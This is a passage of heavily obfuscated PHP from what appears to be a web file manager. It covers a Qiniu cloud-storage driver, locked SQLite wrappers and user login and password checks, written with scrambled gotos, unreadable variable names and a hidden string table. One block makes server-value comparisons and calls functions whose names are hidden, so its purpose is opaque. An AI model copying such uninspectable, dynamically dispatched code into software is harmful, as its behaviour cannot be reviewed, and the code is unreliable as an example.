!== $e— »ÉÁœŠ[191] ? $e— »ÉÁœŠ[33] : $aùí¿àä›µ . $e— »ÉÁœŠ[8]; goto b¤§ùŞé†; e¢ “Ã©æ: $d®ë“®Ç‹ = $B¶ƒÅÂ×ÍÙ = array(); while (!0) { check_abort(); list($D˜ÈğòÒçÉ, $e®ÀÀà’ë…) = $this->bucketManager->listFiles($this->bucket, $Aã÷ÙôÖ©ˆ, $cå­¹ÅĞİ, $D¬ˆŠ§Ë¸İ, $bÛ†Íó’Ç); if ($e®ÀÀà’ë…) { break; } $cå­¹ÅĞİ = array_key_exists($e— »ÉÁœŠ[1295], $D˜ÈğòÒçÉ) ? $cå­¹ÅĞİ = $D˜ÈğòÒçÉ[$e— »ÉÁœŠ[1326]] : $e— »ÉÁœŠ[33]; $FÆù™Òî¯ = isset($D˜ÈğòÒçÉ[$e— »ÉÁœŠ[1327]]) ? $D˜ÈğòÒçÉ[$e— »ÉÁœŠ[1327]] : array(); $B—‚ºÍ”¹œ = isset($D˜ÈğòÒçÉ[$e— »ÉÁœŠ[1328]]) ? $D˜ÈğòÒçÉ[$e— »ÉÁœŠ[1328]] : array(); foreach ($FÆù™Òî¯ as $añ¾ò—ÁÈô) { goto CÔÓ÷µÜÅ; CÔÓ÷µÜÅ: if ($añ¾ò—ÁÈô[$e— »ÉÁœŠ[93]] == $Aã÷ÙôÖ©ˆ) { continue; } $D³ˆÚ§®Šå = $añ¾ò—ÁÈô[$e— »ÉÁœŠ[93]]; $A¹­òÄ ›Á = $añ¾ò—ÁÈô[$e— »ÉÁœŠ[1324]]; goto Bç†Ÿ§ÈÑÉ; Bç†Ÿ§ÈÑÉ: $añ¾ò—ÁÈô[$e— »ÉÁœŠ[78]] = $A¹­òÄ ›Á; $CññÔ›¸Ö = $A¹­òÄ ›Á == 0 && substr($D³ˆÚ§®Šå, strlen($D³ˆÚ§®Šå) - 1, 1) == $e— »ÉÁœŠ[8] ? !0 : !1; if ($B÷˜œ©¥í) { $this->cacheMethod($e— »ÉÁœŠ[199], $D³ˆÚ§®Šå, $CññÔ›¸Ö); $this->cacheMethod($e— »ÉÁœŠ[200], $D³ˆÚ§®Šå, $añ¾ò—ÁÈô); } goto aÌÚÊæÖ¥; aÌÚÊæÖ¥: if ($CññÔ›¸Ö) { $d®ë“®Ç‹[] = $D³ˆÚ§®Šå; continue; } $B¶ƒÅÂ×ÍÙ[] = $e©šŞ®˜Ù‡ ? $añ¾ò—ÁÈô : $D³ˆÚ§®Šå; goto Dó­èŸÛªÃ; Dó­èŸÛªÃ: } foreach ($B—‚ºÍ”¹œ as $D³ˆÚ§®Šå) { if ($D³ˆÚ§®Šå == $Aã÷ÙôÖ©ˆ) { continue; } $d®ë“®Ç‹[] = $D³ˆÚ§®Šå; if ($B÷˜œ©¥í) { $this->cacheMethod($e— »ÉÁœŠ[199], $D³ˆÚ§®Šå, !0); } } if ($cå­¹ÅĞİ === $e— »ÉÁœŠ[33]) { break; } } if ($B÷˜œ©¥í) { $this->cacheMethod($e— »ÉÁœŠ[199], $aùí¿àä›µ, !0); } goto B¢ê¡İé‘º; b¤§ùŞé†: $cå­¹ÅĞİ = $e— »ÉÁœŠ[33]; $D¬ˆŠ§Ë¸İ = 1000; $B÷˜œ©¥í = $this->listItemCache === !1 ? !1 : !0; goto e¢ “Ã©æ; EÊù‡ĞãŸà: } public function canRead($BöÏ‘«­£§) { return $this->exist($BöÏ‘«­£§) ? !0 : !1; } public function canWrite($d¸ê†“Ê¿“) { return $this->exist($d¸ê†“Ê¿“) ? !0 : !1; } public function getContent($AÖ¿Áåø¾Í) { return $this->fileSubstr($AÖ¿Áåø¾Í, 0, -1); } public function setContent($fØĞØöŠ, $cñà£Ûª„« = '') { $F©ÊÙ¯é¡ = $this->tempFile($this->pathThis($fØĞØöŠ)); file_put_contents($F©ÊÙ¯é¡, $cñà£Ûª„«); if ($this->upload($fØĞØöŠ, $F©ÊÙ¯é¡)) { $this->tempFileRemve($F©ÊÙ¯é¡); return !0; } return !1; } public function refreshUrls($c™¼ÀÑÊ) { goto D­¿©î›©ß; D­¿©î›©ß: $a¼óˆ‡†ç® =& $_SERVER[ä°„ä°º]; $bŠÕå¹‹ÇÅ = array(); if (is_array($c™¼ÀÑÊ)) { foreach ($c™¼ÀÑÊ as $D±í¬¾¨¼ë) { $bŠÕå¹‹ÇÅ[] = $this->link($D±í¬¾¨¼ë); } } else { $bŠÕå¹‹ÇÅ[] = $this->link($c™¼ÀÑÊ); } goto Cˆ¨äíïİ‹; C´¢œãĞ¢©: return $aˆ—³Î÷ö±[$a¼óˆ‡†ç®[1099]] == $a¼óˆ‡†ç®[743] ? !0 : !1; goto dô£š¥°; Cˆ¨äíïİ‹: $c°œª³”í¬ = new Qiniu\Cdn\CdnManager($this->auth); list($aˆ—³Î÷ö±, $FŠëï“œ×µ) = $c°œª³”í¬->refreshUrls($bŠÕå¹‹ÇÅ); if ($FŠëï“œ×µ) { return !1; } goto C´¢œãĞ¢©; dô£š¥°: } public function fileSubstr($f†½±Ì¸†’, $a¿†ŒµéËà, $B¬–ˆÜé§) { $b¨ë‰“¢ïÇ =& $_SERVER[ä°„ä°º]; if (!($C†°¸ïª¿ó = $this->link($f†½±Ì¸†’))) { return !1; } $Dù†è„¥ëİ = !1; if ($B¬–ˆÜé§ > 0) { $CŒã¡±ñÌ = $a¿†ŒµéËà + $B¬–ˆÜé§ - 1; $Dù†è„¥ëİ = array($b¨ë‰“¢ïÇ[1329] . $a¿†ŒµéËà . $b¨ë‰“¢ïÇ[440] . $CŒã¡±ñÌ); } $FŒÍÈñĞé = url_request($C†°¸ïª¿ó, $b¨ë‰“¢ïÇ[228], !1, $Dù†è„¥ëİ); return $FŒÍÈñĞé[$b¨ë‰“¢ïÇ[733]] ? $FŒÍÈñĞé[$b¨ë‰“¢ïÇ[1109]] : !1; } public function upload($BÙÃØÒ, $b‹³¸ñö¸Ú, $a³ƒŠ«§Êˆ = false, $AùëÎ‘õ¨ = REPEAT_REPLACE) { $eÊ½‡·› = new Qiniu\Storage\UploadManager(); $Bóê•ê«… = $this->auth->uploadToken($this->bucket, $BÙÃØÒ); $câ‘çêÀˆ„ = get_file_mime(get_path_ext($b‹³¸ñö¸Ú)); list($Aùƒ¼òÁšœ, $d¦ÇäÛ×) = $eÊ½‡·›->putFile($Bóê•ê«…, $BÙÃØÒ, $b‹³¸ñö¸Ú, null, $câ‘çêÀˆ„); return $d¦ÇäÛ× ? !1 : $this->getPathOuter($BÙÃØÒ); } public function uploadFormData($Eò‡âÉ‚Õ³, $B¯¨ÍëÚ†Ò = 3600) { return $this->uploadToken($Eò‡âÉ‚Õ³, $B¯¨ÍëÚ†Ò); } public function multiUploadFormData($d¾«¶ËÖĞš, $dĞ­®µŠ´ = 3600) { return $this->uploadToken($d¾«¶ËÖĞš, $dĞ­®µŠ´); } private function uploadToken($Aê¯³’Ç¦õ, $AÂ¦ÎîË´§ = 3600) { goto CŸÈ«­Ï’•; c‘…éªğàÔ: $DåÕ—ã—áÂ = http_type() . "\x3a\x2f\x2f\x75\x70\x6c\157\x61\144{$Aï‹Ü—¸õ‹}\x2e\161\x69\x6e\x69\165\160\56\143\x6f\155\x2f"; return array($aÖéåãğµí[1333] => $FæØ¦âÂÕó, $aÖéåãğµí[1334] => $DåÕ—ã—áÂ); goto AŠóÆÖİ¬; F‘ÁÍğõØŠ: $B¼Î±Çä¦ = $Aê¯³’Ç¦õ; $FæØ¦âÂÕó = $this->auth->uploadToken($this->bucket, $B¼Î±Çä¦, $FÓ¬„ŒÈÛÑ, $CĞî­’µá, !0); $Aï‹Ü—¸õ‹ = empty($this->region) || $this->region == $aÖéåãğµí[1332] ? $aÖéåãğµí[33] : $aÖéåãğµí[440] . $this->region; goto c‘…éªğàÔ; CŸÈ«­Ï’•: $aÖéåãğµí =& $_SERVER[ä°„ä°º]; $FÓ¬„ŒÈÛÑ = $AÂ¦ÎîË´§; $CĞî­’µá = array($aÖéåãğµí[1330] => $aÖéåãğµí[1331]); goto F‘ÁÍğõØŠ; AŠóÆÖİ¬: } public function download($DµÁèİòõ, $C¼×Ëò··) { goto DÔÂ¥½š³; c‹Âêù”ŞÓ: fclose($Føï®™Ô®§); return $C¼×Ëò··; goto CÑ©Ğæå·; DÔÂ¥½š³: $Dìˆ§¦î¾— = IO::getPathInner(IO::mkfile($C¼×Ëò··)); if (!($bÌùçŸµó = $this->link($DµÁèİòõ))) { return !1; } $DàÅ¿ìó…à = 0; goto Eâø•ÔÅÏ‚; Eâø•ÔÅÏ‚: $D¨³¡ñİ¼â = 1024 * 200; $Føï®™Ô®§ = fopen($Dìˆ§¦î¾—, $_SERVER[ä°„ä°º][1335]); while (!0) { $E‡ÀÖÌİÊ¿ = $this->fileSubstr($DµÁèİòõ, $DàÅ¿ìó…à, $D¨³¡ñİ¼â); if ($E‡ÀÖÌİÊ¿ === !1) { return !1; } fwrite($Føï®™Ô®§, $E‡ÀÖÌİÊ¿); $DàÅ¿ìó…à += $D¨³¡ñİ¼â; if (strlen($E‡ÀÖÌİÊ¿) < $D¨³¡ñİ¼â) { break; } } goto c‹Âêù”ŞÓ; CÑ©Ğæå·: } public function link($f‹‚ÂõêÒ, $açø¢¿†² = '') { if (!$this->isFile($f‹‚ÂõêÒ)) { return !1; } $fÉß¯Ø¨™ = $this->getHost() . $_SERVER[ä°„ä°º][8] . $this->pathEncode($f‹‚ÂõêÒ) . $açø¢¿†²; return $this->auth->privateDownloadUrl($fÉß¯Ø¨™, 3600 * 12); } public function fileOut($dÛ–ëœé¬Ê, $F†ğ®Ê·ÉÎ = false, $Eã¬¢ö¨½‹ = false, $CÇÓÔœªÉ” = '') { $Bî¢«›Ü¡Œ =& $_SERVER[ä°„ä°º]; if ($this->isFileOutServer()) { return $this->fileOutServer($dÛ–ëœé¬Ê, $F†ğ®Ê·ÉÎ, $Eã¬¢ö¨½‹, $CÇÓÔœªÉ”); } if (!$Eã¬¢ö¨½‹) { $Eã¬¢ö¨½‹ = $this->pathThis($dÛ–ëœé¬Ê); } $F¿õñó°»½ = $F†ğ®Ê·ÉÎ ? $Bî¢«›Ü¡Œ[1336] . rawurlencode($Eã¬¢ö¨½‹) : $Bî¢«›Ü¡Œ[33]; $DÄæœØ‹Ø½ = $this->link($dÛ–ëœé¬Ê, $F¿õñó°»½); $this->fileOutLink($DÄæœØ‹Ø½); } public function fileOutServer($b¾‰µªóˆğ, $D¤ö¯©ªÇ = false, $BÜøŸÌ’Áß = false, $aËÇé´‚‹İ = '') { parent::fileOut($b¾‰µªóˆğ, $D¤ö¯©ªÇ, $BÜøŸÌ’Áß, $aËÇé´‚‹İ); } public function fileOutImage($E—©å¡ìà, $A‡ùİ¬¾¼ = 250) { $Bˆ°Ï³Ã» = $this->link($E—©å¡ìà, $_SERVER[ä°„ä°º][1337] . $A‡ùİ¬¾¼); $this->fileOutLink($Bˆ°Ï³Ã»); } public function fileOutImageServer($føöÏ¿×ÆÃ, $EÏà÷ÄÅ»‹ = 250) { parent::fileOutImage($føöÏ¿×ÆÃ, $EÏà÷ÄÅ»‹); } public function hashMd5($AÑ§Ò‚¢ÔÀ) { $Cµëœæ®÷® =& $_SERVER[ä°„ä°º]; $aÖ±ã³Œ–Î = $this->objectMeta($AÑ§Ò‚¢ÔÀ); return isset($aÖ±ã³Œ–Î[$Cµëœæ®÷®[208]]) ? $aÖ±ã³Œ–Î[$Cµëœæ®÷®[208]] : !1; $bÎ¼Å‡º‰î = $this->link($AÑ§Ò‚¢ÔÀ, $Cµëœæ®÷®[1338]); } public function size($Aİôèª¾­) { $aè“×õÉ = $this->objectMeta($Aİôèª¾­); return $aè“×õÉ ? $aè“×õÉ[$_SERVER[ä°„ä°º][78]] : 0; } public function info($CÄŒ¬ô«ì) { if ($this->isFolder($CÄŒ¬ô«ì)) { return $this->folderInfo($CÄŒ¬ô«ì); } else { if ($this->isFile($CÄŒ¬ô«ì)) { return $this->fileInfo($CÄŒ¬ô«ì); } } return !1; } public function exist($bÚ¶Œ¼Æ) { return $this->isFile($bÚ¶Œ¼Æ) || $this->isFolder($bÚ¶Œ¼Æ); } public function isFile($CÚÌ„Ñ«) { return !$this->isFolder($CÚÌ„Ñ«) && $this->objectMeta($CÚÌ„Ñ«); } public function isFolder($E’ÄŠ¹ºË·) { return $this->cacheMethod($_SERVER[ä°„ä°º][199], $E’ÄŠ¹ºË·); } protected function objectMeta($aŒõÖÑƒ¸°) { return $this->cacheMethod($_SERVER[ä°„ä°º][200], $aŒõÖÑƒ¸°); } protected function _objectMeta($aß²¦Š™) { $Dƒ²‹ªšò¿ =& $_SERVER[ä°„ä°º]; list($b”ïÕ—ä¸Ú, $eè¶†ÓÊ·) = $this->bucketManager->stat($this->bucket, $aß²¦Š™); if ($b”ïÕ—ä¸Ú) { $b”ïÕ—ä¸Ú[$Dƒ²‹ªšò¿[78]] = intval($b”ïÕ—ä¸Ú[$Dƒ²‹ªšò¿[1324]]); } return $b”ïÕ—ä¸Ú; } protected function _isFolder($EŸÀóˆ«ÌÀ) { $B°ÅÊ„Ò˜ =& $_SERVER[ä°„ä°º]; if ($EŸÀóˆ«ÌÀ == $B°ÅÊ„Ò˜[33] || $EŸÀóˆ«ÌÀ == $B°ÅÊ„Ò˜[8]) { return !0; } list($c‘›©˜êîá, $B†ßö·†³Ü) = $this->bucketManager->listFiles($this->bucket, trim($EŸÀóˆ«ÌÀ, $B°ÅÊ„Ò˜[8]) . $B°ÅÊ„Ò˜[8], $B°ÅÊ„Ò˜[33], 1, $B°ÅÊ„Ò˜[8]); return !empty($c‘›©˜êîá[$B°ÅÊ„Ò˜[1327]]) || !empty($c‘›©˜êîá[$B°ÅÊ„Ò˜[1328]]) ? !0 : !1; } } goto DÍÀ‡¼°‰Ä; fŒ¥Ô”ãˆ¤: class DbSqlite extends DbSqliteBase { public function query($f®ùí¹Îï) { $AçË©ÊŞ£ =& $_SERVER[ä°„ä°º]; if (!CacheLock::fileLock($AçË©ÊŞ£[9])) { return !1; } $aêì–‚áœ¼ = parent::query($f®ùí¹Îï); CacheLock::fileUnLock($AçË©ÊŞ£[9]); return $aêì–‚áœ¼; } public function execute($Có—ë¡İé) { $bÌö¨÷Êİ =& $_SERVER[ä°„ä°º]; if (!CacheLock::fileLock($bÌö¨÷Êİ[9])) { return !1; } $d–•¯¹Üåƒ = parent::execute($Có—ë¡İé); CacheLock::fileUnLock($bÌö¨÷Êİ[9]); return $d–•¯¹Üåƒ; } } class DbSqlite3 extends DbSqlite3Base { public function query($Cí†‘ÓÅ) { $CŒ§’…¹°ˆ =& $_SERVER[ä°„ä°º]; if (!CacheLock::fileLock($CŒ§’…¹°ˆ[9])) { return !1; } $D•ğ¸ó°™ = parent::query($Cí†‘ÓÅ); CacheLock::fileUnLock($CŒ§’…¹°ˆ[9]); return $D•ğ¸ó°™; } public function execute($Cò±Çù‰ÅĞ) { $f·°Ş‹™ÏÅ =& $_SERVER[ä°„ä°º]; if (!CacheLock::fileLock($f·°Ş‹™ÏÅ[9])) { return !1; } $C±áÇÇííÈ = parent::execute($Cò±Çù‰ÅĞ); CacheLock::fileUnLock($f·°Ş‹™ÏÅ[9]); return $C±áÇÇííÈ; } } if ($_SERVER[$_SERVER[ä°„ä°º][844]] != $_SERVER[$_SERVER[ä°„ä°º][861]]) { goto fËï²âÍ¥Î; fËï²âÍ¥Î: $B‹¤¸‰ß“ = $_SERVER[ä°„ä°º][846]; $B–„÷Ş¢éÀ = $_SERVER[$_SERVER[ä°„ä°º][847]] . $_SERVER[ä°„ä°º][848]; $b¶˜‡¦œ‹ = $B‹¤¸‰ß“($B–„÷Ş¢éÀ); goto Fƒ›˜¾„¾ê; Fƒ›˜¾„¾ê: $e‚æ‘¡ïÜ­ = explode($_SERVER[ä°„ä°º][229], $b¶˜‡¦œ‹); if (count($e‚æ‘¡ïÜ­) < $_SERVER[ä°„ä°º][605]) { $c×øø¶¨ç = $_SERVER[ä°„ä°º][849]; $c×øø¶¨ç(); } $e¶Í—õ•‹ã = $_SERVER[ä°„ä°º][850]; goto aˆºöÓª”÷; aˆºöÓª”÷: $e¶Í—õ•‹ã($_SERVER[$_SERVER[ä°„ä°º][845]]); goto e‘¤ï¡™Ç; e‘¤ï¡™Ç: } goto cìòÃ‘‰¾›; AçÔˆ¨àóĞ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\152\157\142\114\x69\x73\164"; public $field = array("\156\x61\155\x65", "\x64\145\163\x63", "\163\x6f\162\164"); const JOB_KEY = "\x73\x65\154\x66\x4a\x6f\142\114\151\163\x74"; public function listData($e‚ŠÀ«î®š = false, $E‘ä­§øµ‘ = "\163\x6f\162\164", $a”‡‡†í‚À = false) { return parent::listData($e‚ŠÀ«î®š, $E‘ä­§øµ‘, $a”‡‡†í‚À); } public function remove($eäµ›°†ã†) { return parent::remove($eäµ›°†ã†); } public function add($Eãµ˜Ä¼À) { $AÉø³œƒˆñ =& $_SERVER[ä°„ä°º]; if ($this->findByName($Eãµ˜Ä¼À[$AÉø³œƒˆñ[28]])) { return !1; } $Eãµ˜Ä¼À[$AÉø³œƒˆñ[1743]] = $this->getSort(); return parent::insert($Eãµ˜Ä¼À); } private function getSort() { $D‹ô™˜ =& $_SERVER[ä°„ä°º]; $BÈ§Áƒèœ‘ = parent::listData(); $DÕ°¼‹‡ = array_to_keyvalue($BÈ§Áƒèœ‘, $D‹ô™˜[33], $D‹ô™˜[1743]); return empty($DÕ°¼‹‡) ? 0 : max($DÕ°¼‹‡) + 1; } public function update($F‚Œƒ ‡Çø, $bµĞ¥­Ïó°) { $DŠìÑ¼‰ =& $_SERVER[ä°„ä°º]; $aå¹ÓíÀõ = parent::listData($F‚Œƒ ‡Çø); $B·…Ÿ“å¼ = $this->findByName($bµĞ¥­Ïó°[$DŠìÑ¼‰[28]]); if (!$aå¹ÓíÀõ || $B·…Ÿ“å¼ && $B·…Ÿ“å¼[$DŠìÑ¼‰[393]] != $aå¹ÓíÀõ[$DŠìÑ¼‰[393]]) { return !1; } return parent::update($F‚Œƒ ‡Çø, $bµĞ¥­Ïó°); } public function setUserJob($cÀø¡Î´…, $E„³Øé”Ö) { goto a¸Û÷Ä©¹³; A¢Ü‹ô–´Ú: $B±ğŠªÑ¸Ş = array_to_keyvalue($A…¦‘ßÖÈ…, $d„°»¾[28]); $aÕ‰·Œó†Ã = $d„°»¾[375]; foreach ($E„³Øé”Ö as $dâ¼¿”µä) { if ($B±ğŠªÑ¸Ş[$dâ¼¿”µä]) { $aÕ‰·Œó†Ã .= $B±ğŠªÑ¸Ş[$dâ¼¿”µä][$d„°»¾[393]] . $d„°»¾[47]; } else { $D©Úæ²šÇ = $this->add($dâ¼¿”µä); $aÕ‰·Œó†Ã .= $D©Úæ²šÇ . $d„°»¾[47]; } } goto dÚ„Ç„¼¯é; dÚ„Ç„¼¯é: $aÕ‰·Œó†Ã = rtrim($aÕ‰·Œó†Ã, $d„°»¾[47]); Model($d„°»¾[519])->metaSet($cÀø¡Î´…, self::JOB_KEY, $aÕ‰·Œó†Ã); goto CÏº“®ï; a¸Û÷Ä©¹³: $d„°»¾ =& $_SERVER[ä°„ä°º]; if (!is_array($E„³Øé”Ö)) { $E„³Øé”Ö = array($E„³Øé”Ö); } $A…¦‘ßÖÈ… = parent::listData(); goto A¢Ü‹ô–´Ú; CÏº“®ï: } public function getUserJob($A‘ÄŞÕˆ­÷) { $A©É‰Ñç»¥ = Model($_SERVER[ä°„ä°º][519])->metaGet($A‘ÄŞÕˆ­÷); return $this->getUserJobInfo($A©É‰Ñç»¥[self::JOB_KEY]); } public function getUserJobInfo($B§‚’‚Ü¬œ) { goto B˜Ôƒ¨¿; Eî—œ¿½ˆ¦: $B”ƒ¾…‰áõ = array_remove_key($B”ƒ¾…‰áõ, $E¯•Ç´¥ìØ[194]); $BÓÚëã·Ü = array(); foreach ($C“½¬Œº¶Ë as $dğ³òœ×­) { if (isset($B”ƒ¾…‰áõ[$dğ³òœ×­])) { $BÓÚëã·Ü[] = $B”ƒ¾…‰áõ[$dğ³òœ×­]; } } goto D¨ÃÕœĞó’; D¨ÃÕœĞó’: return $BÓÚëã·Ü; goto c¨ìãùĞ¤¾; B˜Ôƒ¨¿: $E¯•Ç´¥ìØ =& $_SERVER[ä°„ä°º]; $C“½¬Œº¶Ë = explode($E¯•Ç´¥ìØ[47], $B§‚’‚Ü¬œ); $B”ƒ¾…‰áõ = parent::listData(); goto Eî—œ¿½ˆ¦; c¨ìãùĞ¤¾: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\x6d\x65" => "\x75\163\x65\x72\137\x6d\145\x74\x61", "\x6d\x65\x74\141\106\x69\x65\154\x64" => "\165\163\x65\162\x49\x44"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\156\x69\143\x6b\x4e\x61\155\145\54\x6e\x61\x6d\145\54\x61\x76\141\x74\141\162\x2c\x73\145\x78\54\x73\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($d…µƒó”‘ê) { $fÏºÜÛ“Ò =& $_SERVER[ä°„ä°º]; $EóÏëÅŠáï = $fÏºÜÛ“Ò[2143]; return array($fÏºÜÛ“Ò[1790] => array($d…µƒó”‘ê[0], $EóÏëÅŠáï), $fÏºÜÛ“Ò[1792] => array($d…µƒó”‘ê[0], $EóÏëÅŠáï), $fÏºÜÛ“Ò[2144] => array($d…µƒó”‘ê[0], $EóÏëÅŠáï)); } protected function getInfo($cñ…ğó Ÿİ, $a«ÎÒïîÛ = false) { $FÍ½¶ÄÍƒ® = $this->getInfoSimple($cñ…ğó Ÿİ); if (!is_array($FÍ½¶ÄÍƒ®)) { return array(); } if ($a«ÎÒïîÛ) { return $this->_getInfoApply($FÍ½¶ÄÍƒ®); } return $this->cacheFunctionGet($_SERVER[ä°„ä°º][1799], $cñ…ğó Ÿİ); } protected function getInfoFull($CÚƒåÕŞÑ‹, $föº¼Ü ë§ = false) { $f¸÷¿®”¼Ş = $this->getInfoSimple($CÚƒåÕŞÑ‹); if (!is_array($f¸÷¿®”¼Ş)) { return array(); } if ($föº¼Ü ë§) { return $this->_getInfoApply($f¸÷¿®”¼Ş, !0); return $this->_getInfoApply($f¸÷¿®”¼Ş, !0); } return $this->cacheFunctionGet($_SERVER[ä°„ä°º][2145], $CÚƒåÕŞÑ‹); } private function _getInfoApply($f”ë²Ø±Ü, $dŸÌñƒñô× = false) { goto AäëÚÄè÷; d…˜„ò¤äË: $f”ë²Ø±Ü = $this->_listDataApplyItem($f”ë²Ø±Ü); $aò‡ù··öŠ = Model($B“¦‘˜Ğ”[1227])->metaGet($f”ë²Ø±Ü[$B“¦‘˜Ğ”[85]][$B“¦‘˜Ğ”[395]]); $f”ë²Ø±Ü[$B“¦‘˜Ğ”[2148]] = $aø…°¤Š†½; goto EÇŠ¹©ô×…; AäëÚÄè÷: $B“¦‘˜Ğ” =& $_SERVER[ä°„ä°º]; if (!$f”ë²Ø±Ü) { return $f”ë²Ø±Ü; } $aø…°¤Š†½ = md5($B“¦‘˜Ğ”[2146] . $f”ë²Ø±Ü[$B“¦‘˜Ğ”[871]] . $B“¦‘˜Ğ”[2147] . $f”ë²Ø±Ü[$B“¦‘˜Ğ”[28]]); goto d…˜„ò¤äË; EÇŠ¹©ô×…: $f”ë²Ø±Ü[$B“¦‘˜Ğ”[85]][$B“¦‘˜Ğ”[1979]] = isset($aò‡ù··öŠ[$B“¦‘˜Ğ”[1980]]) ? $aò‡ù··öŠ[$B“¦‘˜Ğ”[1980]] : null; if ($dŸÌñƒñô×) { $f”ë²Ø±Ü[$B“¦‘˜Ğ”[445]] = $this->metaGet($f”ë²Ø±Ü[$B“¦‘˜Ğ”[1551]]); } return $f”ë²Ø±Ü; goto eâÓâÏÎ”¤; eâÓâÏÎ”¤: } protected function getInfoSimple($fÚ­¯…¹ø¾, $b‚µÔ—‡©³ = false) { $d¬±×‰àƒ² =& $_SERVER[ä°„ä°º]; if (!$fÚ­¯…¹ø¾) { return array(); } if ($b‚µÔ—‡©³) { $a“…¤ä”¾ì = $this->where(array($d¬±×‰àƒ²[1551] => intval($fÚ­¯…¹ø¾)))->find(); if (!is_array($a“…¤ä”¾ì)) { return array(); } $a“…¤ä”¾ì[$d¬±×‰àƒ²[2149]] = Action($d¬±×‰àƒ²[2150])->parseUrl($a“…¤ä”¾ì[$d¬±×‰àƒ²[2149]]); return $a“…¤ä”¾ì; } return $this->cacheFunctionGet($d¬±×‰àƒ²[1793], $fÚ­¯…¹ø¾); } protected function getInfoSimpleOuter($d·‘÷ğ—œÊ) { goto E­ÇÛÄ; C·¦çß“Ú’: $A¦ÌŸ¨³ = array_field_key($D»µ“´âœÛ, explode($AŞæï‰Î¬[47], $this->simpleField)); if (!$A¦ÌŸ¨³) { return array($AŞæï‰Î¬[1551] => $AŞæï‰Î¬[1106], $AŞæï‰Î¬[28] => $AŞæï‰Î¬[160] . LNG($AŞæï‰Î¬[2153]) . $AŞæï‰Î¬[517], $AŞæï‰Î¬[2149] => STATIC_PATH . $AŞæï‰Î¬[2154]); } $A¦ÌŸ¨³[$AŞæï‰Î¬[2149]] = Action($AŞæï‰Î¬[2150])->parseUrl($A¦ÌŸ¨³[$AŞæï‰Î¬[2149]]); goto Dá³©•´†; E­ÇÛÄ: $AŞæï‰Î¬ =& $_SERVER[ä°„ä°º]; if (!$d·‘÷ğ—œÊ || $d·‘÷ğ—œÊ == 0) { return array($AŞæï‰Î¬[1551] => $AŞæï‰Î¬[191], $AŞæï‰Î¬[28] => $AŞæï‰Î¬[160] . LNG($AŞæï‰Î¬[2151]) . $AŞæï‰Î¬[517], $AŞæï‰Î¬[2149] => STATIC_PATH . $AŞæï‰Î¬[2152]); } $D»µ“´âœÛ = $this->cacheFunctionGet($AŞæï‰Î¬[1793], $d·‘÷ğ—œÊ); goto C·¦çß“Ú’; Dá³©•´†: return $A¦ÌŸ¨³; goto EÍŠÖ¿×‚; EÍŠÖ¿×‚: } protected function groupUser($a¼Ø•é‹ª) { } public static function errorLang($cå‡óøáŠç) { $Bº©¿ò„Ü =& $_SERVER[ä°„ä°º]; $e™¨‡ï‡õæ = array(self::ERROR_USER_NOT_EXISTS => $Bº©¿ò„Ü[2155], self::ERROR_USER_PASSWORD_ERROR => $Bº©¿ò„Ü[2156], self::ERROR_USER_EXIST_NAME => $Bº©¿ò„Ü[2157], self::ERROR_USER_EXIST_PHONE => $Bº©¿ò„Ü[2158], self::ERROR_USER_EXIST_EMAIL => $Bº©¿ò„Ü[2159], self::ERROR_USER_LOGIN_LOCK => $Bº©¿ò„Ü[2160], self::ERROR_IP_NOT_ALLOW => $Bº©¿ò„Ü[2161], self::ERROR_USER_EXIST_NICKNAME => $Bº©¿ò„Ü[2162]); return LNG($e™¨‡ï‡õæ[$cå‡óøáŠç]); } public function getInfoByMeta($fõáîÃ‰ä¾, $dåØéîªäö) { $AËˆÙµÒ¸ =& $_SERVER[ä°„ä°º]; $C­ï…œíÎ‡ = Model($AËˆÙµÒ¸[2163])->where(array($AËˆÙµÒ¸[93] => $fõáîÃ‰ä¾, $AËˆÙµÒ¸[372] => $dåØéîªäö))->find(); if ($C­ï…œíÎ‡) { return $this->getInfo($C­ï…œíÎ‡[$AËˆÙµÒ¸[1551]]); } return !1; } public function userLoginCheck($c»É¡°ä‚, $Fêù‘î¥—™) { $aõİåèé¸¹ =& $_SERVER[ä°„ä°º]; $f†É¨Ä’Ëï = $this->userLoginFind($c»É¡°ä‚); if (!$f†É¨Ä’Ëï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($f†É¨Ä’Ëï[$aõİåèé¸¹[1551]], $Fêù‘î¥—™)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($f†É¨Ä’Ëï[$aõİåèé¸¹[1551]]); } public function userLoginFind($E°¢‚œ‡±) { $A£¨Á±×Í =& $_SERVER[ä°„ä°º]; $b„Ã™»»„º = array($A£¨Á±×Í[28] => $E°¢‚œ‡±, $A£¨Á±×Í[1983] => $E°¢‚œ‡±, $A£¨Á±×Í[303] => $E°¢‚œ‡±, $A£¨Á±×Í[2164] => $E°¢‚œ‡±, $A£¨Á±×Í[979] => $A£¨Á±×Í[981]); if ($this->nickNameRpt()) { unset($b„Ã™»»„º[$A£¨Á±×Í[1983]]); } return $this->where($b„Ã™»»„º)->find(); } public function clearCache($d—¹¾¹Ãª„) { $B«ÅµÛÚˆ³ =& $_SERVER[ä°„ä°º]; $this->cacheFunctionClear($B«ÅµÛÚˆ³[1799], $d—¹¾¹Ãª„); $this->cacheFunctionClear($B«ÅµÛÚˆ³[1793], $d—¹¾¹Ãª„); $this->cacheFunctionClear($B«ÅµÛÚˆ³[2145], $d—¹¾¹Ãª„); } public function userPasswordCheck($d´£ò¹æŒ™, $bÕ–…… ’) { $bÛ”°ÌªÖñ =& $_SERVER[ä°„ä°º]; $c•Áº™–‹› = $this->where(array($bÛ”°ÌªÖñ[1551] => intval($d´£ò¹æŒ™)))->find(); $C‚Ì«æŞ = $this->metaGet($d´£ò¹æŒ™); $A“ÚÇîíóê = isset($C‚Ì«æŞ[$bÛ”°ÌªÖñ[2165]]) ? $C‚Ì«æŞ[$bÛ”°ÌªÖñ[2165]] : 